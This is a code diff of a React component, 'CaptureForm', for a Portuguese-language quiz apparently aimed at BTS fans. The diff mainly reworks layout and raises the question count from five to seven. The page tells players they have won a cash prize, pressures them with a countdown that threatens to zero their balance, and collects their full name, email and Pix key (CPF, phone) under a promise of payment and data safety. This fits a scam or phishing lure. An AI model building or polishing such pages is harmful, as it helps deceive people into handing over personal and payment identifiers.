@@ -79,15 +79,15 @@ const CaptureForm = ({ score, correctAnswers, onReset }: CaptureFormProps) => {
 
   if (timeLeft === 0) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-red-900 via-red-800 to-red-700 p-4 flex items-center justify-center">
-        <Card className="max-w-md mx-auto text-center border-2 border-red-300">
-          <CardContent className="p-8">
-            <AlertTriangle className="w-16 h-16 text-red-500 mx-auto mb-4" />
-            <h2 className="text-2xl font-bold text-red-600 mb-4">Tempo Esgotado!</h2>
-            <p className="text-gray-600 mb-6">
+      <div className="h-screen bg-gradient-to-br from-red-900 via-red-800 to-red-700 flex items-center justify-center p-4">
+        <Card className="max-w-sm mx-auto text-center border-2 border-red-300 w-full">
+          <CardContent className="p-6">
+            <AlertTriangle className="w-12 h-12 text-red-500 mx-auto mb-4" />
+            <h2 className="text-xl font-bold text-red-600 mb-4">Tempo Esgotado!</h2>
+            <p className="text-gray-600 mb-6 text-sm">
               Infelizmente o tempo para saque expirou. Seu saldo foi zerado.
             </p>
-            <Button onClick={onReset} className="bg-purple-600 hover:bg-purple-700">
+            <Button onClick={onReset} className="bg-purple-600 hover:bg-purple-700 w-full">
               Jogar Novamente
             </Button>
           </CardContent>
@@ -97,34 +97,34 @@ const CaptureForm = ({ score, correctAnswers, onReset }: CaptureFormProps) => {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-purple-800 to-pink-800 p-4">
-      <div className="max-w-lg mx-auto pt-8">
+    <div className="h-screen bg-gradient-to-br from-purple-900 via-purple-800 to-pink-800 flex flex-col p-4">
+      <div className="flex-1 flex flex-col justify-between max-w-lg mx-auto w-full">
         {/* Header com resultado */}
-        <div className="text-center mb-8">
-          <Trophy className="w-16 h-16 text-yellow-400 mx-auto mb-4" />
-          <h1 className="text-3xl font-bold text-white mb-4">
+        <div className="text-center pt-4 pb-2">
+          <Trophy className="w-12 h-12 text-yellow-400 mx-auto mb-3" />
+          <h1 className="text-xl sm:text-2xl font-bold text-white mb-3">
             🎉 Parabéns, ARMY!
           </h1>
           
           {canWithdraw ? (
             <>
-              <div className="bg-gradient-to-r from-green-500 to-green-600 text-white px-6 py-4 rounded-xl text-2xl font-bold mb-4 shadow-lg">
+              <div className="bg-gradient-to-r from-green-500 to-green-600 text-white px-4 py-3 rounded-xl text-lg sm:text-xl font-bold mb-3 shadow-lg">
                 Você acumulou R${score},00!
               </div>
-              <p className="text-white/90 text-lg">
-                Você acertou {correctAnswers} de 5 perguntas! 🏆
+              <p className="text-white/90 text-sm sm:text-base">
+                Você acertou {correctAnswers} de 7 perguntas! 🏆
               </p>
             </>
           ) : (
             <>
-              <div className="bg-gradient-to-r from-orange-500 to-orange-600 text-white px-6 py-4 rounded-xl text-xl font-bold mb-4 shadow-lg">
+              <div className="bg-gradient-to-r from-orange-500 to-orange-600 text-white px-4 py-3 rounded-xl text-lg font-bold mb-3 shadow-lg">
                 Você acumulou R${score},00
               </div>
-              <p className="text-white/90 text-lg mb-4">
-                Você acertou {correctAnswers} de 5 perguntas
+              <p className="text-white/90 text-sm mb-3">
+                Você acertou {correctAnswers} de 7 perguntas
               </p>
-              <div className="bg-red-500/20 border border-red-400 rounded-lg p-4 text-white">
-                <AlertTriangle className="w-6 h-6 inline mr-2" />
+              <div className="bg-red-500/20 border border-red-400 rounded-lg p-3 text-white text-xs">
+                <AlertTriangle className="w-4 h-4 inline mr-2" />
                 Você precisa acertar pelo menos 3 perguntas para sacar via Pix
               </div>
             </>
@@ -132,17 +132,16 @@ const CaptureForm = ({ score, correctAnswers, onReset }: CaptureFormProps) => {
         </div>
 
         {canWithdraw ? (
-          <>
+          <div className="flex-1 flex flex-col justify-between">
             {/* Urgência */}
-            <Card className="mb-6 border-2 border-red-400 bg-red-50">
-              <CardContent className="p-6">
-                <div className="flex items-center gap-3 text-red-600">
-                  <Clock className="w-6 h-6" />
+            <Card className="mb-4 border-2 border-red-400 bg-red-50">
+              <CardContent className="p-4">
+                <div className="flex items-center gap-2 text-red-600">
+                  <Clock className="w-5 h-5" />
                   <div>
-                    <div className="font-bold text-lg">⏰ ATENÇÃO! Tempo limitado</div>
-                    <div className="text-sm">
-                      Você tem <span className="font-bold text-xl">{formatTime(timeLeft)}</span> para sacar seu prêmio via Pix.
-                      Após esse tempo, seu saldo será zerado!
+                    <div className="font-bold text-sm">⏰ ATENÇÃO! Tempo limitado</div>
+                    <div className="text-xs">
+                      Você tem <span className="font-bold text-base">{formatTime(timeLeft)}</span> para sacar.
                     </div>
                   </div>
                 </div>
@@ -150,84 +149,88 @@ const CaptureForm = ({ score, correctAnswers, onReset }: CaptureFormProps) => {
             </Card>
 
             {/* Formulário */}
-            <Card className="border-2 border-yellow-400 shadow-2xl">
-              <CardHeader className="bg-gradient-to-r from-yellow-400 to-yellow-500">
-                <CardTitle className="text-center text-xl font-bold text-gray-800">
-                  💰 Dados para Saque via Pix
-                </CardTitle>
-              </CardHeader>
-              <CardContent className="p-6">
-                <form onSubmit={handleSubmit} className="space-y-6">
-                  <div>
-                    <Label htmlFor="name" className="text-lg font-semibold">Nome Completo *</Label>
-                    <Input
-                      id="name"
-                      name="name"
-                      type="text"
-                      placeholder="Digite seu nome completo"
-                      value={formData.name}
-                      onChange={handleInputChange}
-                      className="mt-2 text-lg p-4 h-12"
-                      required
-                    />
+            <div className="flex-1">
+              <Card className="border-2 border-yellow-400 shadow-2xl h-full">
+                <CardHeader className="bg-gradient-to-r from-yellow-400 to-yellow-500 p-4">
+                  <CardTitle className="text-center text-lg font-bold text-gray-800">
+                    💰 Dados para Saque via Pix
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="p-4 flex-1 flex flex-col justify-between">
+                  <form onSubmit={handleSubmit} className="space-y-4 flex-1 flex flex-col justify-between">
+                    <div className="space-y-4">
+                      <div>
+                        <Label htmlFor="name" className="text-sm font-semibold">Nome Completo *</Label>
+                        <Input
+                          id="name"
+                          name="name"
+                          type="text"
+                          placeholder="Digite seu nome completo"
+                          value={formData.name}
+                          onChange={handleInputChange}
+                          className="mt-1 text-sm p-3 h-10"
+                          required
+                        />
+                      </div>
+
+                      <div>
+                        <Label htmlFor="email" className="text-sm font-semibold">E-mail *</Label>
+                        <Input
+                          id="email"
+                          name="email"
+                          type="email"
+                          placeholder="Digite seu melhor e-mail"
+                          value={formData.email}
+                          onChange={handleInputChange}
+                          className="mt-1 text-sm p-3 h-10"
+                          required
+                        />
+                      </div>
+
+                      <div>
+                        <Label htmlFor="pixKey" className="text-sm font-semibold">Chave Pix *</Label>
+                        <Input
+                          id="pixKey"
+                          name="pixKey"
+                          type="text"
+                          placeholder="CPF, e-mail, telefone ou chave aleatória"
+                          value={formData.pixKey}
+                          onChange={handleInputChange}
+                          className="mt-1 text-sm p-3 h-10"
+                          required
+                        />
+                      </div>
+                    </div>
+
+                    <Button
+                      type="submit"
+                      disabled={isSubmitting}
+                      className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3 text-base h-12 shadow-lg"
+                    >
+                      {isSubmitting ? (
+                        "Processando..."
+                      ) : (
+                        <>
+                          <CheckCircle className="w-5 h-5 mr-2" />
+                          SACAR R${score},00 VIA PIX
+                        </>
+                      )}
+                    </Button>
+                  </form>
+
+                  <div className="mt-4 text-center text-xs text-gray-600">
+                    🔒 Seus dados estão seguros conosco.<br />
+                    📱 O Pix será enviado em até 24 horas úteis.
                   </div>
-
-                  <div>
-                    <Label htmlFor="email" className="text-lg font-semibold">E-mail *</Label>
-                    <Input
-                      id="email"
-                      name="email"
-                      type="email"
-                      placeholder="Digite seu melhor e-mail"
-                      value={formData.email}
-                      onChange={handleInputChange}
-                      className="mt-2 text-lg p-4 h-12"
-                      required
-                    />
-                  </div>
-
-                  <div>
-                    <Label htmlFor="pixKey" className="text-lg font-semibold">Chave Pix *</Label>
-                    <Input
-                      id="pixKey"
-                      name="pixKey"
-                      type="text"
-                      placeholder="CPF, e-mail, telefone ou chave aleatória"
-                      value={formData.pixKey}
-                      onChange={handleInputChange}
-                      className="mt-2 text-lg p-4 h-12"
-                      required
-                    />
-                  </div>
-
-                  <Button
-                    type="submit"
-                    disabled={isSubmitting}
-                    className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 text-xl h-14 shadow-lg"
-                  >
-                    {isSubmitting ? (
-                      "Processando..."
-                    ) : (
-                      <>
-                        <CheckCircle className="w-6 h-6 mr-2" />
-                        SACAR R${score},00 VIA PIX
-                      </>
-                    )}
-                  </Button>
-                </form>
-
-                <div className="mt-6 text-center text-sm text-gray-600">
-                  🔒 Seus dados estão seguros conosco.<br />
-                  📱 O Pix será enviado em até 24 horas úteis.
-                </div>
-              </CardContent>
-            </Card>
-          </>
+                </CardContent>
+              </Card>
+            </div>
+          </div>
         ) : (
-          <div className="text-center mt-8">
+          <div className="text-center flex-1 flex items-center justify-center">
             <Button 
               onClick={onReset}
-              className="bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold px-8 py-4 text-lg"
+              className="bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold px-8 py-4 text-base w-full max-w-xs"
             >
               Tentar Novamente
             </Button>
